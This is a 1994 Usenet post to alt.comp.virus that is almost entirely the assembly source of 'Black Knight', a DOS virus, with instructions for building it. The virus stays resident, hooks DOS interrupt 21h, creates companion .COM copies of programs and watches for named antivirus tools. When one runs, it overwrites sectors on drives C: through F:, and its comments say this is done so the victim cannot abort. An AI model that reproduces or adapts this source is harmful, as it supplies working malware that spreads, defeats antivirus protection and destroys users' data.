From netcom.com!ix.netcom.com!netnews Tue Nov 29 09:43:54 1994
Xref: netcom.com alt.comp.virus:508
Path: netcom.com!ix.netcom.com!netnews
From: Zeppelin@ix.netcom.com (Mr. G)
Newsgroups: alt.comp.virus
Subject: BlackKnight Virus (ANTI AV VIRUS)
Date: 29 Nov 1994 13:09:23 GMT
Organization: Netcom
Lines: 376
Distribution: world
Message-ID: <3bf963$idi@ixnews1.ix.netcom.com>
References: <sbringerD00yHv.Hs3@netcom.com> <bradleymD011vJ.Lp8@netcom.com>
NNTP-Posting-Host: ix-pas2-10.ix.netcom.com

;Black Knight Anti-Virus-Virus
;Size - 520
;
;Tasm BKNIGHT
;Tlink /T BKNIGHT
;Memory Resident Companion Virus
;Anti-Anti-Virus 
;Formats Drives C: to F: When Anti-Virus Product Is Ran
;Tempest - _ Of Luxenburg
;

		.radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endit
filelength      equ endit - begin
nameptr         equ endit+4
DTA             equ endit+8

	 




begin:          jmp     virus_install                              

virus_name:            
		db     'Black Knight'
		

						 ;install
virus_install:  
		nop
		nop
		nop
		mov     ax,cs                    ; reduce memory size   
  
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a        
		jne     cancel                        
		mov     ax,ds:[0003]                 
		sub     ax,100                        
		mov     ds:0003,ax
Zopy_virus:  
		mov     bx,ax                    ; copy to claimed block 
 
		mov     ax,es                        
		add     ax,bx                       
		mov     es,ax
		mov     cx,offset endit - begin                    
		mov     ax,ds                       
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            
		lea     di,es:0100                  
		rep     movsb                       
						    


Grab_21:                                     
		
		mov     ds,cx                   ; hook int 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already 
installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h                ; revector int 21h to 
virus
		nop
		int     21h
		nop                                

cancel:         ret          

check_exec:     
		pushf

		push    es                     ; push everything onto 
the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is the file being 
		
		
		
		jne     abort                   ; executed?
		
		


					     ;if yes, try the_stinger
do_infect:      call    infect                  ; then try to infect
		
		
			      

abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

Bye_Bye:      
				   ; exit
		jmp     dword ptr cs:[oi21]                     


new_24h:        
		mov     al,3             ; critical error handler
		iret

infect:          
		mov     cs:[name_seg],ds       ; here, the virus 
essentially
		mov     cs:[name_off],dx       ; copies the name of the
		
		cld                            ; loaded file into a 
buffer
		mov     di,dx                  ; so that it can be 
compared
		push    ds                     ; against the default 
names
		pop     es                     ; in the_stinger
		mov     al,'.'                 ; subroutine 
		repne   scasb                  ; <-- 
		
		call    the_stinger            ; check for anti-virus 
load
					       ; and deploy the_stinger
		
		
		
		cld
		mov     word ptr cs:[nameptr],dx
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh
		int     21h
		push    es
		push    bx

		push    cs

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21h

		call    searchpoint
		push    di
		mov     si,offset COM_txt

		mov     cx,3
	 rep    cmpsb 
		pop     di
		jz      do_com
		mov     si,offset EXE_txt
		nop
		mov     cl,3
		rep     cmpsb
		jnz     return

do_exe:         mov     si,offset COM_txt
		nop
		call    change_ext
		mov     ax,3300h
		nop
		int     21h
		push    dx

		cwd
		inc     ax
		push    ax
		int     21h

Grab24h:        
		
		mov     ax,3524h         
		int     21h        
		push    bx
		push    es
		push    cs
		pop     ds
		mov     dx,offset new_24h
		mov     ah,25h
		push    ax
		int     21h
		
		
		lds     dx,dword ptr [nameptr]  ;create the virus 
(unique name)
		xor     cx,cx
		mov     ah,05Bh
		int     21
		jc      return1                 
		xchg    bx,ax                   ;save handle
		


		push    cs
		pop     ds
		mov     cx,filelength          ;cx= length of virus
		mov     dx,offset begin        ;where to start copying
		mov     ah,40h                 ;write the virus to the 
		int     21h                    ;new file

		mov     ah,3Eh                 ; close
		int     21h

return1:        pop     ax
		pop     ds
		pop     dx
		int     21h
		
		pop     ax
		pop     dx
		int     21h
		
		mov     si,offset EXE_txt
		call    change_ext
		
return:         mov     ah,1Ah
		pop     dx
		pop     ds
		int      21H

		ret

do_com:         call    findfirst                 
		cmp     word ptr cs:[DTA+1Ah],endit - begin
		jne     return
		mov     si,offset EXE_txt
		call    change_ext
		call    findfirst
		jnc     return
		mov     si,offset COM_txt
		call    change_ext
		jmp     short return

searchpoint:    les     di,dword ptr cs:[nameptr]
		mov     ch,0FFh
		mov     al,0
	 repnz  scasb
		sub     di,4
		ret
change_ext:     call    searchpoint
		push    cs
		pop     ds
		movsw
		movsw
		ret

findfirst:      lds     dx,dword ptr [nameptr]
		mov     cl,27h
		mov     ah,4Eh
		int     21h
		ret
			 
the_stinger:
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'XR'    ;VIRX
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'PO'    ;VIRUSTOP
		jne     next1                     
		cmp     word ptr es:[di-5],'TS'   
		je      jumptoass                

next1:          cmp     word ptr es:[di-3],'VA'    ;AV = CPAV
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'TO'    ;*prot = F-prot
		jne     next2                
		cmp     word ptr es:[di-5],'RP'  
		je      jumptoass                     

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan = McAfee's 
Scan.
		jne     next3                
		cmp     word ptr es:[di-5],'CS'  
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'NA'    ;*lean = McAfee's 
CLEAN.
		jne     next3                      ; why not, eh?
		cmp     word ptr es:[di-5],'EL'  
		je      jumptoass                     
next3:          ret                
jumptoass:      jmp     nuke                  ;assassination (deletion)
						; of anti-virus program

		
		
nuke:                
		mov     al,2                   ;Lets Total The C: Drive
		mov     cx,25
		cli                             ; Keeps Victim From 
Aborting
		cwd                          
		int     026h                
		sti                         

		mov     al,3                   ;Lets Total The D: Drive
		mov     cx,25
		cli                             ; Keeps Victim From 
Aborting
		cwd                          
		int     026h                
		sti                         

		mov     al,3                   ;Lets Total The E: Drive
		mov     cx,25
		cli                             ; Keeps Victim From 
Aborting
		cwd                          
		int     026h                
		sti                         


		mov     al,5                   ;Lets Total The F: Drive
		mov     cx,25
		cli                             ; Keeps Victim From 
Aborting
		cwd                          
		int     026h                
		sti                         


EXE_txt         db  'EXE',0
COM_txt         db  'COM',0

 

data_1          db      0
data_2          db      0

last            db     090H
name_seg        dw  ?
name_off        dw  ?

c1              db       0          
c2              db       0          
c3              db       0          
c4              db       0          
c5              db       0          
virus_man:      db      'Tempest - _ Of Luxenburg'
			   
endit:


cseg            ends
		end begin





